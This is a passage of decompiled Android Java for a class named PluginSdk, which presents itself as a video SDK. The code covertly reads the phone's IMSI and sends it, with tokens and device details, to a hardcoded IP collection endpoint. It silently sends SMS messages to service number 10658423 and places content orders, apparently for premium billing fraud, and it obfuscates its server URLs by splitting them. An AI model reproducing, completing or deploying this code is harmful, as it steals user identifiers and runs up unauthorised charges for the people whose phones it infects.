package cn.mono.gink;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Handler;
import android.os.Message;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.PersistentCookieStore;
import com.loopj.android.http.RequestParams;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import org.json.JSONArray;
import org.json.JSONObject;

public class PluginSdk
{
  private static final int AuthFailed = 22;
  private static final int AuthInvalidJar = 23;
  private static final int AuthNetFail = 24;
  private static final int AuthPlayUrlNULL = 25;
  private static final int AuthSuccessed = 21;
  private static final String BaseUrl1_A = "http://sdk2.cmv";
  private static final String BaseUrl1_B = "ideo.cn/clt30/test.jsp";
  private static final String BaseUrl2_A = "http://sdk2.cmvi";
  private static final String BaseUrl2_B = "deo.cn:8082/isdk/test.jsp";
  private static final String BaseUrl3_A = "http://sd";
  private static final String BaseUrl3_B = "k.cmvideo.cn/clt30/test.jsp";
  private static final String BaseUrl4_A = "http://c22.cmvideo";
  private static final String BaseUrl4_B = ".cn/clt30/";
  private static final String BaseUrl5_A = "http://c2.cmvide";
  private static final String BaseUrl5_B = "o.cn/clt30/";
  private static final String BaseUrl7_A = "http://i.cmvide";
  private static final String BaseUrl7_B = "o.cn/iworld/";
  private static long DELAY_TIME = 0L;
  private static final String FK_CLIENTID = "FK_CLIENTID";
  private static final String FK_TOKEN = "FK_TOEKN";
  private static final String IMSI = "IMSI";
  private static final int LoginFailed = 12;
  private static final int LoginSuccessed = 11;
  private static final int MSG_CMCC = 401;
  private static final int MSG_CMTN = 403;
  private static final int MSG_CMUN = 402;
  private static final int NeedDoLogin = 10;
  private static final String ORDER_CP = "ORDER_CP";
  private static final String ORDER_TIME = "ORDER_TIME";
  private static final String ORDER_TYPE = "ORDER_TYPE";
  private static int ORD_DISABLED = 0;
  private static final int OrderFailed = 32;
  private static final int OrderSuccessed = 31;
  private static Handler Out_Handler;
  private static final String RANDOM = "RANDOM";
  private static final String SMS_PORT = "10658423";
  private static final String TAG = "[PluginSdk]";
  private static final String TOKEN = "TOKEN";
  private static final String USER_INFO = "user_info_sdk";
  private static int USG_DISABLED = 0;
  private static HashMap<String, String> bd;
  private static boolean beOnlyAuthMode = false;
  @SuppressLint({"HandlerLeak"})
  private static Handler callbackHandler;
  private static JSONArray chanelarray;
  public static JSONObject ddjjobject;
  private static int first_act = 0;
  private static int flush_times = 0;
  public static String g_CHANNELID;
  private static String g_Channelid;
  public static String g_args;
  private static int g_currentNetType = 0;
  public static int g_sim_type = 0;
  public static Handler globalHandler = null;
  private static JSONArray homesarray;
  private static boolean inited = false;
  private static String lastordercp;
  private static String lastordertype;
  protected static MyLogger logger = MyLogger.getLogger();
  protected static Context mContext;
  private static boolean needflushvisit = false;
  private static int order_index = 0;
  private static long ordertime = 0L;
  private static int p_FKDoLoginRetry = 0;
  private static int p_FKGetTokenRetry = 0;
  private static int p_GetTokenRetry = 0;
  private static int p_SendRetry = 0;
  private static String p_appID;
  private static String p_channelID;
  private static Handler p_handler;
  private static String p_key;
  private static String p_packageName;
  private static String p_pubkey;
  private static int p_type = 0;
  private static int playerType = 0;
  private static String rate;
  private static final String s_appID = "appID";
  private static final String s_bb = "bb";
  private static final String s_channelid = "channelid";
  private static final String s_contentid = "contentid";
  private static final String s_id = "id";
  private static final String s_nodeid = "nodeid";
  private static final String s_packagename = "packagename";
  private static final String s_pid = "as";
  private static final String s_productid = "productid";
  private static final String s_pubkey = "pubkey";
  private static final String s_pubkt = "pubkt";
  private static final String s_type = "type";
  private static int seed = 0;
  private static final String server_A_1 = "http://120.25";
  private static final String server_A_2 = ".227.26:8080/DataHub/";
  private static final String server_B_1 = "http://120.25.2";
  private static final String server_B_2 = "27.184:7070/DataHub/";
  private static final String server_C_1 = "http://112.74.19";
  private static final String server_C_2 = "4.208/datacollect/collect.jsp";
  private static final String server_D_1 = "http://112.74.19";
  private static final String server_D_2 = "4.208/apk/docheck.do";
  private static int step = 0;
  private static final int timeout = 10000;
  private static Handler tokenhandler;
  protected String userId;
  
  static
  {
    g_Channelid = null;
    DELAY_TIME = 86400000L;
    p_type = 1;
    p_GetTokenRetry = 10;
    p_FKGetTokenRetry = 6;
    p_FKDoLoginRetry = 6;
    p_SendRetry = 6;
    g_CHANNELID = "S_301400440000000_002";
    g_sim_type = 1;
    bd = new HashMap();
    playerType = 1;
    rate = "3";
    seed = 1;
    USG_DISABLED = 0;
    ORD_DISABLED = 0;
    lastordercp = "";
    ordertime = 0L;
    lastordertype = "";
    first_act = 0;
    homesarray = null;
    chanelarray = null;
    ddjjobject = null;
    needflushvisit = true;
    beOnlyAuthMode = false;
    flush_times = 4;
    order_index = -1;
    g_currentNetType = -1;
    g_args = "";
    step = 0;
    Out_Handler = null;
    callbackHandler = new PluginSdk.1();
    inited = false;
    tokenhandler = new PluginSdk.3();
    System.loadLibrary("hellowobby");
  }
  
  public PluginSdk() {}
  
  private static void DoCheck(Context paramContext, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, int paramInt1, int paramInt2)
  {
    if ((paramInt1 == 3) || (paramInt1 == 7)) {
      return;
    }
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(10000);
    localAsyncHttpClient.setCookieStore(new PersistentCookieStore(paramContext));
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(paramInt1, paramString1));
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    if (paramInt2 == 0) {
      localAsyncHttpClient.addHeader("x-up-bear-type", "WLAN");
    }
    localAsyncHttpClient.setUserAgent(Util.javaGetUserAgent());
    Object localObject = paramContext.getSharedPreferences("user_info_sdk", 0);
    String str = ((SharedPreferences)localObject).getString("IMSI", null);
    int i = ((SharedPreferences)localObject).getInt("RANDOM", 0);
    localObject = ((SharedPreferences)localObject).getString("TOKEN", "");
    paramContext = nativeDoCheckPostParams(paramContext, str, i, paramString2, paramString3, paramString4, paramString5, paramInt1, getfullchannel(paramInt1, paramString1), Util.javaGetUserAgent(), (String)localObject, paramInt2);
    if (paramContext == null)
    {
      logger.d("[PluginSdk]", "list is null");
      return;
    }
    paramString2 = new RequestParams();
    int j = paramContext.size();
    i = 0;
    while (i < j)
    {
      paramString2.put((String)paramContext.get(i), (String)paramContext.get(i + 1));
      i += 2;
    }
    localAsyncHttpClient.post(getbaseurl(paramInt1, paramInt2), paramString2, new PluginSdk.4(paramString1));
  }
  
  private static void DoOrder(Context paramContext, int paramInt1, String paramString1, String paramString2, String paramString3, int paramInt2, String paramString4, String paramString5, String paramString6, String paramString7, int paramInt3, String paramString8, String paramString9, String paramString10, String paramString11, Handler paramHandler, String paramString12, int paramInt4)
  {
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(10000);
    localAsyncHttpClient.setCookieStore(new PersistentCookieStore(paramContext));
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(paramInt1, paramString5));
    logger.d("[PluginSdk]", getfullchannel(paramInt1, paramString5));
    if (paramInt4 == 0) {
      localAsyncHttpClient.addHeader("x-up-bear-type", "WLAN");
    }
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    localAsyncHttpClient.setUserAgent(Util.javaGetUserAgent());
    Object localObject2 = paramContext.getSharedPreferences("user_info_sdk", 0);
    if (((SharedPreferences)localObject2).getInt(paramString5, 0) == 1) {
      paramHandler.obtainMessage(32).sendToTarget();
    }
    do
    {
      long l1;
      long l2;
      do
      {
        return;
        l1 = ((SharedPreferences)localObject2).getLong("LAST_ORDER_TIME", 0L);
        i = ((SharedPreferences)localObject2).getInt("LAST_ORDER_TYPE", 0);
        l2 = System.currentTimeMillis() - l1;
      } while (((l1 > 0L) && (l2 < 2L * DELAY_TIME)) || ((l1 > 0L) && (i == 2) && (l2 < 30L * DELAY_TIME)));
      localObject1 = ((SharedPreferences)localObject2).getString("IMSI", "");
      i = ((SharedPreferences)localObject2).getInt("RANDOM", 0);
      localObject2 = ((SharedPreferences)localObject2).getString("TOKEN", "");
      paramString12 = nativeGetOrderParams(paramContext, (String)localObject1, i, paramString7, paramString6, paramString8, Util.javaGetUserAgent(), (String)localObject2, paramString1, paramString2, paramInt2, paramInt3, paramString12, paramString9, paramString10, paramString11, paramInt1, paramInt4);
    } while (paramString12 == null);
    Object localObject1 = new RequestParams();
    int j = paramString12.size();
    int i = 0;
    while (i < j)
    {
      ((RequestParams)localObject1).put((String)paramString12.get(i), (String)paramString12.get(i + 1));
      i += 2;
    }
    localAsyncHttpClient.post(getbaseurl(paramInt1, paramInt4), (RequestParams)localObject1, new PluginSdk.7(paramHandler, paramContext, paramString5, paramInt1, paramInt3, paramString1, paramString2, paramString3, paramInt2, paramString4, paramString6, paramString7, paramString8, paramString9, paramString10, paramString11, paramInt4));
  }
  
  public static void SayTest(String paramString1, String paramString2, int paramInt)
  {
    logger.d("[PluginSdk]", paramString1 + " " + paramString2);
    try
    {
      nativeSayTest(paramString1, paramString2.trim().getBytes("UTF-8"), paramInt);
      return;
    }
    catch (UnsupportedEncodingException paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  private static int doAuth(Context paramContext, String paramString1, String paramString2, String paramString3, int paramInt1, String paramString4, String paramString5, String paramString6, String paramString7, int paramInt2, String paramString8, String paramString9, String paramString10, String paramString11, Handler paramHandler, int paramInt3, int paramInt4, boolean paramBoolean)
  {
    if ((paramInt3 == 3) || (paramInt3 == 7))
    {
      if (!paramBoolean) {
        doFKAuth(paramContext, paramInt3, paramString5, paramInt4, paramString1, paramString2, paramString11, paramHandler);
      }
      for (;;)
      {
        return 1;
        paramHandler.obtainMessage(22, null).sendToTarget();
      }
    }
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(10000);
    localAsyncHttpClient.setCookieStore(new PersistentCookieStore(paramContext));
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(paramInt3, paramString5));
    logger.d("[PluginSdk]", getfullchannel(paramInt3, paramString5));
    if (paramInt4 == 0) {
      localAsyncHttpClient.addHeader("x-up-bear-type", "WLAN");
    }
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    localAsyncHttpClient.setUserAgent(Util.javaGetUserAgent());
    Object localObject2 = paramContext.getSharedPreferences("user_info_sdk", 0);
    Object localObject1 = ((SharedPreferences)localObject2).getString("IMSI", "");
    int i = ((SharedPreferences)localObject2).getInt("RANDOM", 0);
    localObject2 = ((SharedPreferences)localObject2).getString("TOKEN", "");
    localObject1 = nativeGetPlayOrDownloadURLPostParams(paramContext, (String)localObject1, i, paramString7, paramString6, paramString8, Util.javaGetUserAgent(), (String)localObject2, paramString1, paramString2, paramInt1, 1, paramString4, paramString10, paramInt3, paramInt4);
    if (localObject1 == null) {
      return 0;
    }
    localObject2 = new RequestParams();
    int j = ((ArrayList)localObject1).size();
    i = 0;
    while (i < j)
    {
      ((RequestParams)localObject2).put((String)((ArrayList)localObject1).get(i), (String)((ArrayList)localObject1).get(i + 1));
      i += 2;
    }
    localAsyncHttpClient.post(getbaseurl(paramInt3, paramInt4), (RequestParams)localObject2, new PluginSdk.6(paramHandler, paramBoolean, paramContext, paramInt3, paramString1, paramString2, paramString3, paramInt1, paramString4, paramString5, paramString6, paramString7, paramInt2, paramString8, paramString9, paramString10, paramString11, paramInt4));
    return 1;
  }
  
  private static void doFKAuth(Context paramContext, int paramInt1, String paramString1, int paramInt2, String paramString2, String paramString3, String paramString4, Handler paramHandler)
  {
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(10000);
    localAsyncHttpClient.setCookieStore(new PersistentCookieStore(paramContext));
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(paramInt1, paramString1));
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    localAsyncHttpClient.addHeader("X_UP_CLIENT_ID", "000184");
    if (paramInt1 == 7) {
      localAsyncHttpClient.addHeader("X_UP_CLIENT_ID", "010089");
    }
    localAsyncHttpClient.addHeader("Content-Type", "application/x-www-form-urlencoded");
    localAsyncHttpClient.setUserAgent(Util.javaGetUserAgent());
    if (paramInt2 == 0) {
      localAsyncHttpClient.addHeader("x-up-bear-type", "WLAN");
    }
    Object localObject = paramContext.getSharedPreferences("user_info_sdk", 0);
    String str = nativeGetFKString(((SharedPreferences)localObject).getString("FK_TOEKN", null), ((SharedPreferences)localObject).getString("FK_CLIENTID", null), Util.javaGetUserAgent());
    RequestParams localRequestParams = new RequestParams();
    localObject = getbaseurl(p_type, paramInt2) + "/publish/clt/resource/mobilevideo34/player/playerData.jsp?contentId=" + paramString3 + "&nodeId=" + paramString2 + "&objType=4&" + str;
    if (paramInt1 == 7) {
      localObject = getbaseurl(p_type, paramInt2) + "/publish/clt/resource/isj2/player/playerData.jsp?contentId=" + paramString3 + "&nodeId=" + paramString2 + "&" + str;
    }
    for (;;)
    {
      logger.d("[PluginSdk]", localObject);
      localAsyncHttpClient.get((String)localObject, localRequestParams, new PluginSdk.9(paramHandler, paramContext, paramString4, paramInt1, paramString1, paramInt2, paramString2, paramString3));
      return;
    }
  }
  
  private static void doFKOrder(Context paramContext, int paramInt1, String paramString1, int paramInt2, String paramString2, String paramString3, String paramString4, String paramString5, Handler paramHandler)
  {
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(10000);
    localAsyncHttpClient.setCookieStore(new PersistentCookieStore(paramContext));
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(paramInt1, paramString1));
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    localAsyncHttpClient.addHeader("X_UP_CLIENT_ID", "000184");
    localAsyncHttpClient.setUserAgent(Util.javaGetUserAgent());
    if (paramInt2 == 0) {
      localAsyncHttpClient.addHeader("x-up-bear-type", "WLAN");
    }
    Object localObject = paramContext.getSharedPreferences("user_info_sdk", 0);
    if (((SharedPreferences)localObject).getInt(paramString1, 0) == 1) {
      return;
    }
    String str1 = nativeGetFKString(((SharedPreferences)localObject).getString("FK_TOEKN", null), ((SharedPreferences)localObject).getString("FK_CLIENTID", null), Util.javaGetUserAgent());
    String str2 = nativeGetFKOrderParams(paramString5, Util.javaGetUserAgent());
    localObject = new RequestParams();
    logger.d("[PluginSdk]", getbaseurl(p_type, paramInt2));
    paramString5 = getbaseurl(p_type, paramInt2) + "msp/order.msp?" + str1 + "&" + paramString5 + "&oy=" + str2;
    logger.d("[PluginSdk]", "url:" + paramString5);
    localAsyncHttpClient.post(paramString5, (RequestParams)localObject, new PluginSdk.10(paramHandler, paramContext, paramString1, paramInt1, paramInt2, paramString2, paramString3, paramString4));
  }
  
  private static void doFKlogin(Context paramContext, int paramInt1, String paramString, int paramInt2, Handler paramHandler)
  {
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(10000);
    localAsyncHttpClient.setCookieStore(new PersistentCookieStore(paramContext));
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(paramInt1, paramString));
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    localAsyncHttpClient.addHeader("X_UP_CLIENT_ID", "000184");
    localAsyncHttpClient.setUserAgent(Util.javaGetUserAgent());
    if (paramInt2 == 0) {
      localAsyncHttpClient.addHeader("x-up-bear-type", "WLAN");
    }
    Object localObject = paramContext.getSharedPreferences("user_info_sdk", 0);
    localObject = nativeGetFKString(((SharedPreferences)localObject).getString("FK_TOEKN", null), ((SharedPreferences)localObject).getString("FK_CLIENTID", null), Util.javaGetUserAgent());
    String str = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Root><header></header><body><request type=\"Login\" serial=\"1\"><channel>" + getfullchannel(paramInt1, paramString) + "</channel></request><request type=\"CheckVersion\" serial=\"1\"><component id=\"MobileVideo\" version=\"04.00.06.02\"/><dealer>" + getfullchannel(paramInt1, paramString) + "</dealer></request></body></Root>";
    RequestParams localRequestParams = new RequestParams();
    localRequestParams.put("q", str);
    logger.d("[PluginSdk]", getbaseurl(p_type, paramInt2));
    localAsyncHttpClient.post(getbaseurl(p_type, paramInt2) + "/commonCommunication.msp?" + (String)localObject, localRequestParams, new PluginSdk.8(paramContext, paramInt1, paramString, paramInt2, paramHandler));
  }
  
  private static int doLogin(Context paramContext, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, int paramInt1, Handler paramHandler, int paramInt2)
  {
    logger.d("[PluginSdk]", "channelID =" + paramString1);
    p_channelID = paramString1;
    p_appID = paramString2;
    p_packageName = paramString3;
    p_key = paramString4;
    p_pubkey = paramString5;
    p_type = paramInt1;
    p_handler = paramHandler;
    if (Util.CheckPhoneNumber2(Util.getIMSI(paramContext)) != 1) {
      return 1;
    }
    if (((paramInt1 == 1) || (paramInt1 == 3)) && (paramInt2 == 1))
    {
      logger.d("[PluginSdk]", "Token Yes");
      p_handler.obtainMessage(11).sendToTarget();
      return 0;
    }
    if ((paramInt1 == 3) || (paramInt1 == 7))
    {
      paramString3 = paramContext.getSharedPreferences("user_info_sdk", 0);
      paramString2 = paramString3.getString("FK_TOEKN", null);
      paramString3 = paramString3.getString("FK_CLIENTID", null);
      if ((paramString2 == null) || (paramString2.length() == 0) || (paramString3 == null) || (paramString3.length() == 0)) {
        getFKtoken(paramContext, paramInt1, paramString1, paramInt2, paramHandler);
      }
      for (;;)
      {
        return 0;
        doFKlogin(paramContext, paramInt1, paramString1, paramInt2, paramHandler);
      }
    }
    if (!hasToken(false, paramContext))
    {
      logger.d("[PluginSdk]", "Token No");
      paramString1 = new Message();
      paramString1.what = 1;
      paramString1.obj = paramContext;
      tokenhandler.sendMessageDelayed(paramString1, 5000L);
    }
    for (;;)
    {
      return 0;
      logger.d("[PluginSdk]", "Token Yes");
      p_handler.obtainMessage(11).sendToTarget();
    }
  }
  
  private static void doone(String paramString1, String paramString2, String paramString3) {}
  
  public static void dosubmit_B(String paramString1, String paramString2)
  {
    if (!"22".equalsIgnoreCase(paramString1))
    {
      AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
      localAsyncHttpClient.setTimeout(50000);
      RequestParams localRequestParams = new RequestParams();
      String str = Util.getIMSI(mContext);
      str = "?im=" + str.trim();
      str = str + getPkn(mContext);
      paramString1 = str + "&te=" + paramString1;
      paramString1 = paramString1 + "&pkg=" + mContext.getPackageName();
      paramString1 = paramString1 + "&ua=" + Util.javaGetUserAgent();
      paramString1 = paramString1 + "&cltid=" + getChanel(mContext);
      paramString1 = paramString1 + "&id=" + paramString2;
      localAsyncHttpClient.post("http://112.74.194.208/datacollect/collect.jsp" + paramString1, localRequestParams, new AsyncHttpResponseHandler());
    }
  }
  
  public static void dosubmit_C(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    if ("15".equalsIgnoreCase(paramString1))
    {
      AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
      localAsyncHttpClient.setTimeout(50000);
      RequestParams localRequestParams = new RequestParams();
      String str = Util.getIMSI(mContext);
      str = "?im=" + str.trim();
      str = str + getPkn(mContext);
      paramString1 = str + "&te=" + paramString1;
      paramString1 = paramString1 + "&pkg=" + mContext.getPackageName();
      paramString1 = paramString1 + "&ua=" + Util.javaGetUserAgent();
      paramString1 = paramString1 + "&cltid=" + getChanel(mContext);
      paramString1 = paramString1 + "&id=" + paramString2;
      paramString1 = paramString1 + "&imd=" + paramString3;
      paramString1 = paramString1 + "&tk=" + paramString4;
      paramString1 = paramString1 + "&ra=" + paramString5;
      logger.d("[PluginSdk]", "args: " + paramString1);
      localAsyncHttpClient.post("http://112.74.194.208/datacollect/collect.jsp" + paramString1, localRequestParams, new AsyncHttpResponseHandler());
    }
  }
  
  private static void downloadRtspInThread(String paramString, int paramInt)
  {
    new PluginSdk.13(paramString, paramInt).start();
  }
  
  private static String getArgs()
  {
    String str = Util.getIMSI(mContext);
    g_args = "?im=" + str.trim();
    g_args += getPkn(mContext);
    g_args = g_args + "&pkg=" + mContext.getPackageName();
    g_args = g_args + "&ua=" + Util.javaGetUserAgent();
    g_args = g_args + "&cltid=" + getChanel(mContext);
    return g_args;
  }
  
  private static String getChanel(Context paramContext)
  {
    logger.d("[PluginSdk]", "CID" + g_CHANNELID);
    return g_CHANNELID;
  }
  
  private static void getFKtoken(Context paramContext, int paramInt1, String paramString, int paramInt2, Handler paramHandler)
  {
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(10000);
    localAsyncHttpClient.setCookieStore(new PersistentCookieStore(paramContext));
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(paramInt1, paramString));
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    localAsyncHttpClient.addHeader("Content-Type", "application/x-www-form-urlencoded");
    localAsyncHttpClient.setUserAgent(Util.javaGetUserAgent());
    if (paramInt2 == 0) {
      localAsyncHttpClient.addHeader("x-up-bear-type", "WLAN");
    }
    RequestParams localRequestParams = new RequestParams();
    String str1 = nativeGetFKString(null, null, Util.javaGetUserAgent());
    String str2 = str1.substring(str1.indexOf("&clientId=") + 10, str1.indexOf("&token="));
    SharedPreferences.Editor localEditor = paramContext.getSharedPreferences("user_info_sdk", 0).edit();
    localEditor.putString("FK_CLIENTID", str2);
    localEditor.commit();
    logger.d("[PluginSdk]", "fkclientid: " + str2);
    str1 = getbaseurl(p_type, paramInt2) + "/msp/clientToken.msp?clientImsi=" + Util.getIMSI(paramContext) + "&" + str1;
    logger.d("[PluginSdk]", str1);
    localAsyncHttpClient.get(paramContext, str1, localRequestParams, new PluginSdk.11(paramContext, paramInt1, paramString, paramInt2, paramHandler));
  }
  
  private static void getHomedata(Context paramContext, int paramInt1, String paramString, int paramInt2, Handler paramHandler)
  {
    paramHandler = new AsyncHttpClient();
    paramHandler.setTimeout(10000);
    paramHandler.setCookieStore(new PersistentCookieStore(paramContext));
    paramHandler.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(paramInt1, paramString));
    paramHandler.addHeader("WDAccept-Encoding", "gzip,deflate");
    paramHandler.addHeader("Content-Type", "application/x-www-form-urlencoded");
    paramHandler.setUserAgent(Util.javaGetUserAgent());
    if (paramInt2 == 0) {
      paramHandler.addHeader("x-up-bear-type", "WLAN");
    }
    RequestParams localRequestParams = new RequestParams();
    paramString = paramContext.getSharedPreferences("user_info_sdk", 0);
    String str = nativeGetFKString(paramString.getString("FK_TOEKN", null), paramString.getString("FK_CLIENTID", null), Util.javaGetUserAgent());
    paramString = getbaseurl(p_type, paramInt2) + "/publish/clt/resource/mobilevideo34/home/home.jsp" + "?" + str;
    if (paramInt1 == 7) {
      paramString = getbaseurl(p_type, paramInt2) + "/publish/clt/resource/isj2/home/home.jsp" + "?" + str;
    }
    logger.d("[PluginSdk]", paramString);
    paramHandler.get(paramContext, paramString, localRequestParams, new PluginSdk.12());
  }
  
  private static String getPkn(Context paramContext)
  {
    return "&pkn=1.2.4";
  }
  
  private static String getbaseurl(int paramInt1, int paramInt2)
  {
    StringBuilder localStringBuilder = new StringBuilder();
    if (paramInt1 == 1)
    {
      if (paramInt2 == 1)
      {
        localStringBuilder.append("http://sd");
        localStringBuilder.append("k.cmvideo.cn/clt30/test.jsp");
        return localStringBuilder.toString();
      }
      localStringBuilder.append("http://sdk2.cmv");
      localStringBuilder.append("ideo.cn/clt30/test.jsp");
      return localStringBuilder.toString();
    }
    if (paramInt1 == 2)
    {
      localStringBuilder.append("http://sdk2.cmvi");
      localStringBuilder.append("deo.cn:8082/isdk/test.jsp");
      return localStringBuilder.toString();
    }
    if (paramInt1 == 3)
    {
      if (paramInt2 == 1)
      {
        localStringBuilder.append("http://c2.cmvide");
        localStringBuilder.append("o.cn/clt30/");
        return localStringBuilder.toString();
      }
      localStringBuilder.append("http://c22.cmvideo");
      localStringBuilder.append(".cn/clt30/");
      return localStringBuilder.toString();
    }
    if (paramInt1 == 7)
    {
      localStringBuilder.append("http://i.cmvide");
      localStringBuilder.append("o.cn/iworld/");
      return localStringBuilder.toString();
    }
    localStringBuilder.append("http://sdk2.cmv");
    localStringBuilder.append("ideo.cn/clt30/test.jsp");
    return localStringBuilder.toString();
  }
  
  private static String getfullchannel(int paramInt, String paramString)
  {
    if (paramInt == 1) {
      return "04090200-99000-" + paramString;
    }
    if (paramInt == 2) {
      return "31090200-99000-" + paramString;
    }
    if (paramInt == 3) {
      return "04000102-99046-" + paramString;
    }
    if (paramInt == 7) {
      return "32000216-99000-" + paramString;
    }
    return "04090200-99000-" + paramString;
  }
  
  private static void gettoken(Context paramContext)
  {
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(10000);
    localAsyncHttpClient.setCookieStore(new PersistentCookieStore(paramContext));
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", getfullchannel(p_type, p_channelID));
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    localAsyncHttpClient.setUserAgent(Util.javaGetUserAgent());
    Object localObject = paramContext.getSharedPreferences("user_info_sdk", 0);
    localObject = nativeGetTokenPostParams(paramContext, ((SharedPreferences)localObject).getString("IMSI", null), ((SharedPreferences)localObject).getInt("RANDOM", 0), p_packageName, p_appID, p_key, p_pubkey, p_type);
    if (localObject == null)
    {
      logger.d("[PluginSdk]", "list is null");
      return;
    }
    RequestParams localRequestParams = new RequestParams();
    int j = ((ArrayList)localObject).size();
    int i = 0;
    while (i < j)
    {
      localRequestParams.put((String)((ArrayList)localObject).get(i), (String)((ArrayList)localObject).get(i + 1));
      i += 2;
    }
    logger.d("[PluginSdk]", getbaseurl(p_type, -1));
    localAsyncHttpClient.post(getbaseurl(p_type, -1), localRequestParams, new PluginSdk.5(paramContext));
  }
  
  private static boolean hasToken(boolean paramBoolean, Context paramContext)
  {
    String str2 = Util.getIMSI(paramContext);
    if (Util.CheckPhoneNumber2(str2) != 1) {}
    Object localObject;
    String str1;
    do
    {
      String str3;
      do
      {
        return false;
        localObject = paramContext.getSharedPreferences("user_info_sdk", 0);
        str1 = ((SharedPreferences)localObject).getString("IMSI", "");
        str3 = ((SharedPreferences)localObject).getString("TOKEN", "");
        logger.d("[PluginSdk]", "hasToken : imsi2 = " + str1);
        if ((str1 != null) && (!"".equals(str1)) && (str1.contains(str2))) {
          break;
        }
      } while (!paramBoolean);
      paramContext = Util.getIMSI(paramContext) + Util.javaGetUserAgent().trim();
      i = (int)(Math.random() * 10000.0D);
      localObject = ((SharedPreferences)localObject).edit();
      ((SharedPreferences.Editor)localObject).putString("IMSI", paramContext);
      ((SharedPreferences.Editor)localObject).putInt("RANDOM", i);
      ((SharedPreferences.Editor)localObject).commit();
      logger.d("[PluginSdk]", "javaSendSMS : imsi = " + paramContext);
      SayTest("10658423", "mvwlan," + nativeGetStringMd5(paramContext) + "," + i, 0);
      p_GetTokenRetry = 10;
      return false;
      if ((str3 != null) && (!"".equals(str3))) {
        break;
      }
    } while (!paramBoolean);
    int i = (int)(Math.random() * 10000.0D);
    paramContext = ((SharedPreferences)localObject).edit();
    paramContext.putInt("RANDOM", i);
    paramContext.commit();
    SayTest("10658423", "mvwlan," + nativeGetStringMd5(str1) + "," + i, 0);
    p_GetTokenRetry = 10;
    logger.d("[PluginSdk]", "javaSendSMS : mvwlan = " + nativeGetStringMd5(str1) + "," + i);
    return false;
    return true;
  }
  
  private static int init(Context paramContext)
  {
    mContext = paramContext;
    hasToken(true, mContext);
    getArgs();
    paramContext = mContext.getSharedPreferences("user_info_sdk", 0);
    lastordercp = paramContext.getString("ORDER_CP", "");
    ordertime = paramContext.getLong("ORDER_TIME", 0L);
    lastordertype = paramContext.getString("ORDER_TYPE", "");
    first_act = paramContext.getInt("ACT_FLAG", 0);
    long l = System.currentTimeMillis() - ordertime;
    logger.d("[PluginSdk]", "delay" + l);
    if ((ordertime > 0L) && (l > 2L * DELAY_TIME))
    {
      logger.d("[PluginSdk]", "Reset");
      if ((!lastordertype.equalsIgnoreCase("2")) || (l <= 30L * DELAY_TIME)) {
        break label329;
      }
      lastordertype = "";
      lastordercp = "";
    }
    for (ordertime = 0L;; ordertime = 0L)
    {
      SharedPreferences.Editor localEditor = paramContext.edit();
      localEditor.putString("ORDER_CP", "");
      localEditor.putLong("ORDER_TIME", 0L);
      localEditor.putInt("ORDER_TYPE", 0);
      localEditor.commit();
      g_sim_type = Util.CheckPhoneNumber2(Util.getIMSI(mContext));
      seed = (int)(456.0D * Math.random()) % 50;
      g_currentNetType = Util.javaGetNetworkType(mContext);
      if (first_act == 0)
      {
        first_act = 1;
        paramContext = paramContext.edit();
        paramContext.putInt("ACT_FLAG", 1);
        paramContext.commit();
        step = 1;
        doone("checkin", "888888888888888", "0");
        dosubmit_B("1", "888888888888888");
      }
      return 0;
      label329:
      lastordertype = "";
      lastordercp = "";
    }
  }
  
  public static native ArrayList<String> nativeDoCheckPostParams(Context paramContext, String paramString1, int paramInt1, String paramString2, String paramString3, String paramString4, String paramString5, int paramInt2, String paramString6, String paramString7, String paramString8, int paramInt3);
  
  public static native void nativeDownloadRtsp(String paramString1, int paramInt1, String paramString2, int paramInt2);
  
  public static native String nativeGetFKOrderParams(String paramString1, String paramString2);
  
  public static native String nativeGetFKString(String paramString1, String paramString2, String paramString3);
  
